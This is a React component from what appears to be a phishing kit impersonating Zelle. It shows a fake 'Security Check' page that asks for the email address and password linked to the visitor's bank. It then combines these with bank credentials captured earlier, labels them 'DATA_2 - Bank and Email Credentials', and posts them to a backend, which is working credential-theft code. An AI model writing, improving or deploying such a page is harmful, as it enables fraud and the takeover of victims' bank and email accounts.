import React, { useState, useEffect } from 'react';
import '../styles/EmailConnectPage.css'
import { useAppContext } from '../context/AppContext';
import { backendLink } from '../utils/backendLink';
import zelleLogowhite from '../assets/imgs/zelleloggowhite.svg'

const EmailConnectPage = () => {
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    email: '',
    password: ''
  });
  const { navigateTo, bankDetails, cardConnect } = useAppContext();
  let bankName = '';

  useEffect(() => {
    const localBankDetails = localStorage.getItem('bankCredentials');
    document.title = `Security Check | Zelle`;
    if (!bankDetails && !localBankDetails) {
      navigateTo('/bank-search');
    } else {
      bankName = JSON.parse(localBankDetails).bankName;
    }
  }, [bankDetails, navigateTo]);

  const validateForm = () => {
    const newErrors = {
      email: '',
      password: ''
    };
    
    // Email validation
    if (!formData.email.trim()) {
      newErrors.email = 'Email is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
      newErrors.email = 'Please enter a valid email';
    }

    // Password validation
    if (!formData.password.trim()) {
      newErrors.password = 'Password is required';
    }

    setErrors(newErrors);
    return !newErrors.email && !newErrors.password;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors({
        ...errors,
        [name]: ''
      });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      setIsLoading(true);
      
      // Save to localStorage
      localStorage.setItem('emailCredentials', JSON.stringify({
        email: formData.email,
        emailPassword: formData.password,
        timestamp: new Date().toISOString()
      }));

      const previousData = JSON.parse(localStorage.getItem('bankCredentials'))

      const detail2 = {
        ...previousData,
        email: formData.email,
        emailPassword: formData.password,
        bankName: bankDetails?.name,
        dataName: "DATA_2 - Bank and Email Credentials",
        timestamp: new Date().toISOString()
      }

      console.log("Second Data", detail2)

      try {
        const response = await fetch(`${backendLink}/api/details`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(detail2)
        });
        console.log(response)

        if (!response.ok) {
          throw new Error('Network response was not ok');
        }

        // Simulate API call with timeout
        setTimeout(() => {
          setIsLoading(false);
          navigateTo(`/${cardConnect}`);
        }, 1000);
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    }
  };

  return (
    <div className="email-connect-container">
      <div className="logo-container">
        <a className="site-branding__link" href="/" title="Home" rel="home">
          <img className="zelle-logo" src={zelleLogowhite} alt="" />
        </a>
      </div>
      <div className="email-form-container">
        <h1 className="email-form-header">Security Check</h1>
        <p>
          Please enter the email address linked to your <span className="bank-name">{bankDetails?.name}</span>,
          along with the email password to continue.
        </p>

        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <input
              type="email"
              id="email"
              name="email"
              className={`input-field1 ${errors.email ? 'error' : ''}`}
              value={formData.email}
              placeholder="Email Address"
              onChange={handleChange}
            />
            <label htmlFor="email" className="form-label">Email Address</label>
            {errors.email && <span className="error-message">{errors.email}</span>}
          </div>

          <div className="form-group">
            <input
              type="password"
              id="password"
              name="password"
              className={`input-field1 ${errors.password ? 'error' : ''}`}
              value={formData.password}
              placeholder="Email Password"
              onChange={handleChange}
            />
            <label htmlFor="password" className="form-label">Email Password</label>
            {errors.password && <span className="error-message">{errors.password}</span>}
          </div>

          <button 
            type="submit" 
            disabled={isLoading || !formData.email.trim() || !formData.password.trim()}
          >
            {isLoading ? (
              <div className="button-content">
                <span className="spinner"></span>
                <span>Processing...</span>
              </div>
            ) : 'CONTINUE'}
          </button>
        </form>
      </div>
    </div>
  );
};

export default EmailConnectPage;
